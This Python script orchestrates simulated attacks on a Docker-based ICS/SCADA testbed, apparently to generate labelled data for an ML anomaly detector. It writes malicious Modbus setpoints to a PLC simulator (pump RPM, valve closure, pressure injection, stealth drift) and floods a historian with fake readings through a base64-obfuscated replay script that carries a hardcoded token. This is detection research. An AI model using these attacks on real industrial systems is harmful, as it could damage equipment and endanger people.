#!/usr/bin/env python3
"""
Fixed Insider / HMI Setpoint Attack Smoke Test Orchestrator
===========================================================
Source Container: ics_scada_ssh (Purdue Level 2 SCADA Engineering Workstation)
Network Interface: ot-net (172.24.0.8:502)
Target: plc_simulator
"""

import os
import sys
import time
import datetime
import subprocess
import csv

PROJECT_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
RESULTS_DIR = os.path.join(PROJECT_DIR, "results")
SMOKE_DIR   = os.path.join(RESULTS_DIR, "insider_smoke_test_fixed_data")
ATTACK_CSV  = os.path.join(SMOKE_DIR, "attack_results_extended.csv")
LOG_FILE    = os.path.join(RESULTS_DIR, "insider_smoke_fixed_run.log")

EVAL_PYTHON = sys.executable

os.makedirs(SMOKE_DIR, exist_ok=True)

def log(msg):
    ts   = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{ts}] {msg}"
    print(line, flush=True)
    with open(LOG_FILE, "a") as f:
        f.write(line + "\n")

def record_attack(phase, name, status, detail=""):
    utc_now = datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
    with open(ATTACK_CSV, "a", newline="") as f:
        writer = csv.writer(f)
        writer.writerow([utc_now, phase, name, status, detail])
    log(f"RECORDED: Phase {phase} ({name}) - {status} - {detail}")

def utc_now_iso():
    return datetime.datetime.now(datetime.timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")

def run_cmd(cmd, label=""):
    log(f"EXEC [{label}]: {cmd}")
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    if res.returncode != 0:
        log(f"  [ERROR] Exit code {res.returncode}: {res.stderr}")
    return res.stdout.strip()

def run_insider_scada_attack(rpm=2800, valve=0, hold_s=10):
    """
    Executes Phase 9 Insider Setpoint Attack strictly from ics_scada_ssh
    (the Purdue Level 2 SCADA Engineering Workstation) over ot-net.
    """
    cmd = (
        f"docker exec -t ics_scada_ssh python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient('172.24.0.8', port=502); c.connect(); "
        f"c.write_register(200, {rpm}); time.sleep(1); "
        f"c.write_register(201, {valve}); time.sleep({hold_s}); "
        f"c.write_register(200, 1200); "
        f"c.write_register(201, 500); c.close()\""
    )
    run_cmd(cmd, label="SCADA Workstation Insider Attack (ics_scada_ssh)")

def run_semantic_injection(pressure=350):
    cmd = (
        f"docker exec -t attacker_node python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; "
        f"c = ModbusTcpClient(host='plc_simulator', port=502); c.connect(); "
        f"c.write_register(100, {pressure}); c.close()\""
    )
    run_cmd(cmd, label="Phase 4 Semantic Injection (attacker_node)")

def run_stealth_drift(step_psi=3, delay_s=5, num_steps=8):
    drift_loop = f"for i in range({num_steps}): c.write_register(100, base + (i+1)*{step_psi}); time.sleep({delay_s})"
    cmd = (
        f"docker exec -t attacker_node python3 -c \""
        f"from pymodbus.client import ModbusTcpClient; import time; "
        f"c = ModbusTcpClient(host='plc_simulator', port=502); c.connect(); "
        f"base = c.read_holding_registers(100, count=1).registers[0]; "
        f"exec({drift_loop!r}); c.close()\""
    )
    run_cmd(cmd, label="Phase 5 Stealth Drift")

def run_replay_attack(pressure=125.0, count=200, frame_delay_s=0.1):
    import base64
    endpoint = "http://ics_historian:8086/api/v2/write?org=my_refinery&bucket=sensor_logs&precision=ns"
    script = (
        f"import time, requests\n"
        f"ep = '{endpoint}'\n"
        f"hdr = {{'Authorization': 'Token supersecrettoken', 'Content-Type': 'text/plain; charset=utf-8'}}\n"
        f"for _ in range({count}):\n"
        f"    requests.post(ep, headers=hdr, data='pipeline_metrics,location=pump_station_01,source=historian_bridge pressure={pressure} ' + str(time.time_ns()), timeout=2)\n"
        f"    time.sleep({frame_delay_s})\n"
    )
    b64_script = base64.b64encode(script.encode('utf-8')).decode('utf-8')
    cmd = f"docker exec -t attacker_node python3 -c \"import base64; exec(base64.b64decode('{b64_script}').decode('utf-8'))\""
    run_cmd(cmd, label="Phase 8 Replay Attack")

def reset_ml_engine():
    run_cmd("docker exec -t ics_ml_engine python3 -c \"import requests; requests.post('http://localhost:8000/retrain', timeout=5)\"", label="Reset ML Engine")

def main():
    log("=" * 70)
    log("FIXED INSIDER ATTACK SMOKE TEST — Phase 1: Baseline (180s)")
    log("=" * 70)
    campaign_start = utc_now_iso()
    
    with open(ATTACK_CSV, "w", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "phase", "phase_name", "status", "detail"])
        
    for tick in range(18):
        time.sleep(10)
        log(f"  Baseline: {(tick+1)*10}/180 s elapsed")

    reset_ml_engine()
    log("Waiting 15 s for model fit ...")
    time.sleep(15)

    log("=" * 70)
    log("FIXED INSIDER ATTACK SMOKE TEST — Phase 2: Validation (225s)")
    log("=" * 70)
    record_attack(5, "phase5_payload", "started", "Validation — Stealth Drift +3 PSI x 8")
    run_stealth_drift(step_psi=3, delay_s=5, num_steps=8) # 40s
    record_attack(5, "phase5_payload", "completed")
    time.sleep(15)

    record_attack(9, "phase9_insider", "started", "Validation — SCADA Insider Setpoint RPM=2800 Valve=0 hold=10s")
    run_insider_scada_attack(rpm=2800, valve=0, hold_s=10) # 10s
    record_attack(9, "phase9_insider", "completed")
    time.sleep(15)

    record_attack(4, "phase4_exploit", "started", "Validation — Phase 4 Injection 350 PSI")
    run_semantic_injection(pressure=350)
    record_attack(4, "phase4_exploit", "completed")
    time.sleep(60)

    log("=" * 70)
    log("FIXED INSIDER ATTACK SMOKE TEST — Phase 3: Test (300s)")
    log("=" * 70)
    record_attack(9, "phase9_insider", "started", "Test Instance 1 — SCADA Insider Setpoint RPM=3000 Valve=0 hold=10s")
    run_insider_scada_attack(rpm=3000, valve=0, hold_s=10)
    record_attack(9, "phase9_insider", "completed")
    time.sleep(25)

    record_attack(4, "phase4_exploit", "started", "Test — Phase 4 Injection 360 PSI")
    run_semantic_injection(pressure=360)
    record_attack(4, "phase4_exploit", "completed")
    time.sleep(25)

    record_attack(9, "phase9_insider", "started", "Test Instance 2 — SCADA Insider Setpoint RPM=2900 Valve=0 hold=12s")
    run_insider_scada_attack(rpm=2900, valve=0, hold_s=12)
    record_attack(9, "phase9_insider", "completed")
    time.sleep(25)

    record_attack(8, "phase8_replay", "started", "Test — Phase 8 Replay 125 PSI x 200 frames")
    run_replay_attack(pressure=125.0, count=200, frame_delay_s=0.1)
    record_attack(8, "phase8_replay", "completed")
    time.sleep(25)

    record_attack(9, "phase9_insider", "started", "Test Instance 3 — SCADA Insider Setpoint RPM=3200 Valve=0 hold=10s")
    run_insider_scada_attack(rpm=3200, valve=0, hold_s=10)
    record_attack(9, "phase9_insider", "completed")

    log("All attacks complete. Cooling down 60 s ...")
    time.sleep(60)
    campaign_end = utc_now_iso()

    log("=" * 70)
    log("Exporting telemetry to results/insider_smoke_test_fixed_data ...")
    log("=" * 70)
    save_script = os.path.join(PROJECT_DIR, "scripts", "save_results.py")
    cmd_export = (
        f"{shlex_quote(EVAL_PYTHON)} {shlex_quote(save_script)} "
        f"--start {shlex_quote(campaign_start)} "
        f"--stop {shlex_quote(campaign_end)} "
        f"--out-dir {shlex_quote(SMOKE_DIR)}"
    )
    run_cmd(cmd_export, label="Save Telemetry CSVs")
    
    # Copy attack_results_extended.csv into SMOKE_DIR
    run_cmd(f"cp {shlex_quote(ATTACK_CSV)} {shlex_quote(SMOKE_DIR)}/", label="Copy attack CSV")
    log(f"SUCCESS: Fixed smoke test data exported to {SMOKE_DIR}")

def shlex_quote(s):
    import shlex
    return shlex.quote(s)

if __name__ == "__main__":
    main()
